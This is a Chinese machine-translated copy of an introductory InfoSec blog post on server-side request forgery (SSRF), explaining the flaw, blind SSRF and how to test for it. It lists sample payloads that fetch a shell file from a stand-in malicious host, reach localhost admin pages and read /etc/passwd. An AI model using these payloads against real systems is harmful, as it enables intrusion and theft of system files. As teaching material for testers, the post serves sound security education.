<html>
<head>
<title>SSRF — The Server’s Loophole 01</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">SSRF——服务器的漏洞01</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/ssrf-the-servers-loophole-01-6e7e33fb1d57?source=collection_archive---------5-----------------------#2022-08-27">https://infosecwriteups.com/ssrf-the-servers-loophole-01-6e7e33fb1d57?source=collection_archive---------5-----------------------#2022-08-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="ee5e" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">成功的网络攻击往往始于“网络边界”。</h2></div><p id="4729" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">随着公司的发展，保护网络中成千上万台机器的安全变得越来越困难。通常，攻击者在网络中需要妥协的只是一台面向公众的机器/web服务器上的一个bug。</p><p id="14b8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">今天，我们将讨论网络边界上的一个常见但严重的漏洞，称为SSRF。我们将讨论它如何允许攻击者改变公司的网络，以及如何发现这个漏洞。</p></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><figure class="lj lk ll lm gt ln gh gi paragraph-image"><div role="button" tabindex="0" class="lo lp di lq bf lr"><div class="gh gi li"><img src="../Images/94546aac684ddd28ad6dd889552781ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l0hX7Oqef_FmZWM_bBXz2A.jpeg"/></div></div></figure><h1 id="3782" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">什么是SSRF？</h1><p id="5cf0" class="pw-post-body-paragraph kf kg iq kh b ki mm jr kk kl mn ju kn ko mo kq kr ks mp ku kv kw mq ky kz la ij bi translated">服务器端请求伪造(SSRF) -是一种漏洞，当攻击者能够代表服务器发送请求时，或者我们可以说SSRF是一种漏洞，允许攻击者诱导服务器端应用程序向非预期位置发出请求。</p><p id="791e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">例如:想象一下，有一个公开的网络服务器在一个公司的网络上，比如:public.example.com</p><p id="cccd" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">public.example.com的<em class="mr">托管位于/proxy的代理服务，该服务将获取“URL”边界中指定的网页，并将其显示给用户。例如:当用户访问URL时，</em></p><blockquote class="ms mt mu"><p id="334e" class="kf kg mr kh b ki kj jr kk kl km ju kn mv kp kq kr mw kt ku kv mx kx ky kz la ij bi translated">【http://public.example.com/proxy?url=google.com T4】</p></blockquote><p id="9f68" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">网络应用程序将显示“google.com”的主页</p><figure class="lj lk ll lm gt ln gh gi paragraph-image"><div role="button" tabindex="0" class="lo lp di lq bf lr"><div class="gh gi mz"><img src="../Images/2694be2e93aa570ccb47eaece19f31d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PEyPHon7eClnN6nnGBw_VQ.png"/></div></div></figure><p id="255f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在让我们假设admin.example.com是一个内部服务器托管一个隐藏的管理面板。</p><p id="50d7" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">为了确保只有员工可以访问管理面板，设置了访问控制，以便除了内部有效IP之外，任何其他人都不能访问该面板。现在，如果一个来自互联网的随机用户试图访问管理url，并且如果web应用程序中没有SSRF保护机制，那么应用程序将向该随机用户显示管理面板。</p><figure class="lj lk ll lm gt ln gh gi paragraph-image"><div class="gh gi na"><img src="../Images/d4a1413f49896910bfdb7ff022e64bc6.png" data-original-src="https://miro.medium.com/v2/resize:fit:646/format:webp/1*b8y-HRyupsIYqI9tLLBe1A.jpeg"/></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">从web应用程序隐藏管理面板</figcaption></figure><p id="75e1" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">通常会被防火墙阻止的未授权请求(如获取网络中的隐藏服务)是不允许的。这是因为在面向公众的web服务器和互联网机器之间的网络边界上存在的保护在public.example.com和admin.example.com之间的可信网络上的机器之间不存在</p><figure class="lj lk ll lm gt ln gh gi paragraph-image"><div role="button" tabindex="0" class="lo lp di lq bf lr"><div class="gh gi li"><img src="../Images/8bc3a803ec0c415d6f5a1b3ad3557f98.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yK9OdXVW6q7Q3qDQCzRwnA.jpeg"/></div></div></figure><p id="e502" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">利用“伪造”来自可信服务器的请求的能力，攻击者现在可以在网络上进行各种恶意活动。根据给予易受攻击的服务器的权限，攻击者可能能够读取敏感文件、进行内部API调用和访问内部服务，如隐藏的管理面板。</p><h1 id="6bf5" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">SSRF的类型—</h1><p id="0ed5" class="pw-post-body-paragraph kf kg iq kh b ki mm jr kk kl mn ju kn ko mo kq kr ks mp ku kv kw mq ky kz la ij bi translated">有两种类型的SSRF漏洞:正常的SSRF和盲目的SSRF。这两种漏洞背后的机制是相同的。它们都利用同一网络中机器之间的信任。唯一的区别是，在盲SSRF中，攻击者不会通过HTTP响应或错误消息从服务器收到反馈(就像上面的例子中admin.example.com是如何显示的)。尽管这增加了数据泄露和网络探测的难度，但盲SSRF对攻击者来说仍然极具价值。稍后我们将对此进行更深入的探讨。</p><h1 id="3a22" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">为SSRF测试—</h1><p id="7b26" class="pw-post-body-paragraph kf kg iq kh b ki mm jr kk kl mn ju kn ko mo kq kr ks mp ku kv kw mq ky kz la ij bi translated">发现SSRF漏洞的最佳方法是手动检查代码，查看是否所有的url输入都经过了验证。但是，如果源代码不可用，应该将精力集中在测试最容易出现SSRF的web应用程序的功能上。SSRF还有另一个方面:当应用服务器能够与用户不能直接到达的其他后端系统交互时，通常会出现信任关系。这些后端系统通常具有可路由的私有IP地址，或者仅限于某些主机。由于它们受到网络拓扑的保护，它们通常缺乏更复杂的控制。这些内部系统通常包含敏感数据或功能。</p><p id="4398" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">考虑以下请求:</p><blockquote class="ms mt mu"><p id="a3df" class="kf kg mr kh b ki kj jr kk kl km ju kn mv kp kq kr mw kt ku kv mx kx ky kz la ij bi translated">得到<a class="ae my" href="https://exmple.com/page?page=about.php" rel="noopener ugc nofollow" target="_blank">https://example.com/page?page=about.php</a></p></blockquote><p id="d380" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">您可以使用以下有效负载来测试这个请求。</p><p id="8510" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> <em class="mr">加载文件的内容:</em> </strong></p><blockquote class="ms mt mu"><p id="36ea" class="kf kg mr kh b ki kj jr kk kl km ju kn mv kp kq kr mw kt ku kv mx kx ky kz la ij bi translated">得到<a class="ae my" href="https://example.com/page?page=https://malicious.com/shell.php" rel="noopener ugc nofollow" target="_blank">https://example.com/page?page = https://恶意. com/shell.php </a></p></blockquote><p id="decd" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> <em class="mr">访问受限页面:</em> </strong></p><blockquote class="ms mt mu"><p id="009c" class="kf kg mr kh b ki kj jr kk kl km ju kn mv kp kq kr mw kt ku kv mx kx ky kz la ij bi translated">得到<a class="ae my" href="https://exmple.com/page?page=http://localhost/admin" rel="noopener ugc nofollow" target="_blank">https://example.com/page?page=http://localhost/admin</a></p></blockquote><p id="6847" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">或</strong></p><blockquote class="ms mt mu"><p id="3a18" class="kf kg mr kh b ki kj jr kk kl km ju kn mv kp kq kr mw kt ku kv mx kx ky kz la ij bi translated">得到<a class="ae my" href="https://exmple.com/page?page=http://localhost/admin" rel="noopener ugc nofollow" target="_blank">https://example.com/page?page=http://127.0.0.1/admin</a></p></blockquote><p id="4b74" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">使用环回接口访问仅限主机访问的内容。这种机制意味着，如果您有权访问主机，您也有权直接访问<strong class="kh ir"> admin </strong>页面。</p><p id="9a09" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">获取本地文件:</strong></p><blockquote class="ms mt mu"><p id="e52a" class="kf kg mr kh b ki kj jr kk kl km ju kn mv kp kq kr mw kt ku kv mx kx ky kz la ij bi translated">得到<a class="ae my" href="https://example.com/page?page=file://etc/passwd" rel="noopener ugc nofollow" target="_blank">https://example.com/page?page=file://etc/passwd</a></p></blockquote><p id="42fe" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">使用的HTTP方法:</strong></p><p id="5dcc" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">上面所有的有效负载都可以应用于任何类型的HTTP请求，也可以注入到header和cookie值中。</p><p id="0bb7" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">关于POST请求的SSRF的一个重要注意事项是，SSRF也可能以一种盲目的方式出现，因为应用程序可能不会立即返回任何内容。相反，注入的数据可用于其他功能，如PDF报告、发票或订单处理等。，它可能对雇员或职员可见，但不一定对最终用户或测试人员可见。</p><p id="06f9" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在下一篇博客中，我们将通过一些真实世界的例子来讨论寻找和利用SSRF漏洞的最佳方法。</p><p id="f36e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">感谢阅读。请帮助我使这成为新黑客更好的资源。请随意指出任何错误或让我知道我是否应该补充什么:)</p><p id="597c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">直到那时；</p><p id="5c51" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">醒吃骇客重复🔥</strong></p><figure class="lj lk ll lm gt ln gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/d7ea79461173d041f73922602535174e.png" data-original-src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*wo93cKGBcfA52GDXtmyBeg.png"/></div></figure></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><p id="e792" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="mr">来自Infosec的报道:Infosec上每天都有很多事情发生，很难跟上。</em> <a class="ae my" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="kh ir"> <em class="mr">加入我们的每周简讯</em> </strong> </a> <em class="mr">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>